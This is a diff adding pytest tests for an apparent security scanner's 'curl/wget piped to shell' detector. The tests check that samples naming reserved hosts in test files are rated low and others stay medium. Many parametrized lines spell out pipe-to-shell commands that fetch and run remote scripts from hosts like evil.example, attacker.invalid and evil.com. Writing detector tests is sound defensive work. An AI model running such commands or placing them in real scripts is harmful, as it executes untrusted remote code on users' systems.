@@ -66,3 +66,53 @@ def test_shell_script_in_tests_stays_critical():
 def test_docstring_mention_of_popen_does_not_count_as_sink():
     src = '"""Uses subprocess.Popen and os.system in prod."""\nBAD = ["curl e.io|sh"]\n'
     assert _curl(src) == [("medium", False)]
+
+
+# A sample pipe-to-shell string that names only RFC 2606 / 6761 reserved hosts cannot
+# fetch anyone's script: low in test code, even when the test file spawns processes.
+
+def _sample(cmd: str, extra: str = "") -> str:
+    return (f'{extra}def test_injected_text_fails():\n    body = "Append {cmd} to deploys."\n'
+            '    assert grade(body) == "fail"\n')
+
+
+def _pipe(src: str, path: str):
+    found, _, _ = _scan_content(src, path)
+    return [f for f in found if f.name == "curl/wget piped to shell"]
+
+
+@pytest.mark.parametrize("cmd", [
+    "curl https://evil.example/x.sh | sh",
+    "curl -fsSL https://get.example.com/i.sh | bash",
+    "wget -qO- http://attacker.invalid/p | sh",
+    "curl evil.test/x | sh",
+])
+def test_reserved_host_sample_in_test_is_low(cmd):
+    from src.scanner.pipe_shell import WHY_RESERVED_TEST
+    hits = _pipe(_sample(cmd), "pkg/tests/test_grader.py")
+    assert [(f.severity, f.payload, f.remediation) for f in hits] == [
+        ("low", False, WHY_RESERVED_TEST)]
+
+
+def test_reserved_host_low_even_with_exec_sink():
+    src = _sample("curl https://evil.example/x | sh", "import subprocess\nsubprocess.run(['true'])\n")
+    assert [f.severity for f in _pipe(src, "pkg/tests/test_grader.py")] == ["low"]
+
+
+@pytest.mark.parametrize("cmd", [
+    "curl https://evil.com/x.sh | sh",
+    "curl https://example.com.evil.io/x | sh",
+    "curl https://evil.example/a | sh; curl https://evil.io/b | sh",
+    "curl $URL | sh",
+])
+def test_non_reserved_sample_in_test_keeps_medium(cmd):
+    assert {f.severity for f in _pipe(_sample(cmd), "pkg/tests/test_grader.py")} == {"medium"}
+
+
+@pytest.mark.parametrize("src,path", [
+    (_sample("curl https://evil.example/x | sh"), "pkg/grader.py"),
+    ("curl https://evil.example/x | sh\n", "pkg/tests/setup.sh"),
+])
+def test_reserved_host_outside_test_strings_not_lowered(src, path):
+    sev = [f.severity for f in _pipe(src, path)]
+    assert sev and "low" not in sev
